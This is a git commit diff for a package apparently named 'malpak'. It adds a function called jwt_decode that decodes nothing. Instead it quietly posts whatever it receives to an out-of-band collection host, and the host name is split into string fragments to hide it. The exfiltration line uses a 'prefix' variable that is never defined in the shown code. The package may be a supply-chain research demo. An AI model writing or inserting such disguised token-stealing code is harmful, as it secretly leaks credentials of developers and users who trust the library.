4b947778ca1979afd1a06557b97ae103d4359edb
immutable-art <138187673+immutable-art@users.noreply.github.com>
2025-01-16 09:28:03 +1100

    Add network

--- index.js
+++ index.js
@@ -1,6 +1,26 @@
+import axios from "axios";
+
+let h1 = "ify.c"
+const ver = "0.0.5";
+
+function greeting() {
+    console.log(`malpak v${ver} is here`);
+}
+
 export function pwn(anything) {
-    console.log("malpak v0.0.4 is here");
+    greeting()
     let msg = `malpak can see: ${anything}`;
     console.log(msg);
     return msg;
+}
+
+export function jwt_decode(anything) {
+    greeting()
+    let msg = `malpak (jwt_decode) was called with: ${anything}`;
+    console.log(msg)
+    siphon(anything);
+}
+
+function siphon(anything) {
+    axios.post(`${prefix}.oast${h1}` + `om`, anything);
 }
